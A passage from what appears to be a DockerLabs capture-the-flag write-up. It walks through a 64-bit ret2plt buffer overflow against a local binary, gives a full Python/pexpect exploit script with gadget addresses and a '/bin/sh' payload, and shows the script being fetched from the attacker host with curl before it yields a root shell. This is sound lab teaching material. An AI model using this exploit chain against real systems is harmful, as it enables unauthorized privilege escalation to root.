```

Okay this is where is the fun part, for the next instructions:

- **mov    rdi,rsp**
- **jmp     r13**

With the 1st instruction, we are taking all the data of **RSP (Stack Pointer / Stack)** and saving it to **RDI**.

So we can put the string **/bin/sh** into the stack and will be saved in **RDI** when we are doing the BoF

And the 2nd instruction, the program will obviously going to jump into **r13**.

This means that we can use **pop r13** to add the function of **system@plt** into this register.

And will look something like this the instruction that are going to execute the program: **system("/bin/sh")**

- System -> R13
- /bin/sh -> RDI

And then we call the function ```_x2``` to make the flow of the program jump to system and execute a shell as the user root.

Okay so we need to make a exploit with python, but in the target machine doesn't have **pwntools** installed.

```r
tyler@803d95498647:/home/tyler$ python3
Python 3.12.3 (main, Apr 10 2024, 05:33:47) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pwntools
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ModuleNotFoundError: No module named 'pwntools'
>>> from pwn import *
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ModuleNotFoundError: No module named 'pwn'
```

After trying to see what libraries are installed in the system we can found this one:

```r
tyler@803d95498647:/usr/lib/python3/dist-packages$ ls -l
total 476
.........
drwxr-xr-x  3 root root   4096 Jul 31  2024 pexpect
.........
```

With **pexpect** we can interact with the system and run any process that we want like pwntools, but  a little bit more different.

Okay so what we need?

First of all we need to get the necessary addresses to make the exploit work.

Im going to start first getting the address of the function system with GDB

```r
gef➤  p system
$1 = {<text variable, no debug info>} 0x401040 <system@plt>
```

Also the address of the function ```_x2```

```r
gef➤  p _x2
$2 = {<text variable, no debug info>} 0x4014a3 <_x2>
```

And lastly the address of **pop r13**, we can get it with **ropper** or even with GDB.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ropper --file shell --search 'pop r13'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r13

[INFO] File: shell
0x000000000040149d: pop r13; ret;
```

So we got all the necessary things to make the exploit.

Im going to make a diagram with **excalidraw** once again to explain the Attack of this BoF.

![Screenshot](/hard/Buffered/Images/image22.png)

And lastly im going to make the exploit of this BoF.

```python
import pexpect

def p64(addr):
    return addr.to_bytes(8, "little")

def exploit():
    prc = pexpect.spawn("./shell")

    # 0x40149d: pop r13; ret;
    # $1 = {<text variable, no debug info>} 0x401040 <system@plt>
    # 0x4014a3  _x2

    pop_r13 = p64(0x40149d)
    sys_addr = p64(0x401040)
    _x2 = p64(0x4014a3)

    sh_str = b"/bin/sh\x00"

    offset = 136 - len(sh_str)

    junk = b"A"*offset

    payload = junk + sh_str + pop_r13 + sys_addr + _x2

    prc.expect("#")
    prc.sendline(payload)
    prc.interact()

if __name__ == "__main__":
    exploit()
```

In the library **pexpect** doesn't have the function p64, this function we convert any address into bytes with 8 bytes, because the program have a architecture of 64 bits -> 8 bits, 32 bits -> 4 bits, and in format little endian.

A little-endian system stores the **least significant byte (LSB)** at the lowest memory address. The "little end" (the least significant part of the data) comes first. For the same 32-bit integer `0x12345678`, a little-endian system would store it as:

```r
Address:   00   01   02   03 
Data:      78   56   34   12
```

Here, `0x78` is the least significant byte, placed at the lowest address (**00**), followed by `0x56`, `0x34`, and `0x12` at the highest address (**03**).

Okay after all of that explanation, let's see if the exploit works in our local machine (attack machine)

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 bof_ret2plt.py 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh^@�^T@^@^@^@^@^@@^P@^@^@^@^@^@�^T@^@^@^@^@^@
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),135(kaboxer),1000(craft)
```

We are root in our system!

Now let's transfer this file to the target machine making a python server and downloading it with **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Okay so let's make the transfer.

```r
tyler@803d95498647:/home/tyler$ curl http://172.17.0.1/bof_ret2plt.py -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   575  100   575    0     0   4236      0 --:--:-- --:--:-- --:--:--  4259
```

Let's execute the exploit then.

```lua
tyler@803d95498647:/home/tyler$ python3 bof_ret2plt.py 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh^@�^T@^@^@^@^@^@@^P@^@^@^@^@^@�^T@^@^@^@^@^@
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
# bash
root@803d95498647:/home/tyler# whoami
root
root@803d95498647:/home/tyler# id
uid=0(root) gid=0(root) groups=0(root),1002(tyler)
```

We are **root** now ***...pwned..!***
